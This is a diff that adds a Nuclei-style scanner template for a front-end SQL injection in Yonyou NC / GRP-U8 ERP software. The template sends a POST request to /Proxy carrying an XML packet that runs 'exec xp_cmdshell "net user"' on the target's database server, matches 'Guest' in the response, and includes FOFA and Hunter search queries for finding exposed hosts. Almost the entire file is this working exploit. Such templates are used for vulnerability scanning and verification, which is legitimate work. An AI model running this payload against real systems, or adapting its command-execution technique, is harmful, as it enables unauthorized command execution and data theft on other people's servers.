@@ -1,0 +1,41 @@
+id: 用友nc GRP-u8 sql注入
+
+
+info:
+  name: 用友nc GRP-u8 sql注入
+  severity: high
+  description: 用友nc等版本存在前台SQL注入漏洞，攻击者可利用该漏洞获取系统敏感信息等
+  metadata:
+    max-request: 2
+    verified: true
+    fofa-query: FOFA:app="用友-NC-Cloud"
+    Hunter: web.body="uap/rbac"
+  
+http:
+  - method: 
+      - POST
+      - POST
+    path:
+      - "{{BaseURL}}/Proxy"
+
+    Rheader:
+      - Content-Type:application/x-www-form-urlencoded
+        
+    body: 
+      - |
+        cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">exec xp_cmdshell "net user"</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>
+        
+
+      
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Guest"
+
+      - type: status
+        status:
+          - 200
+    
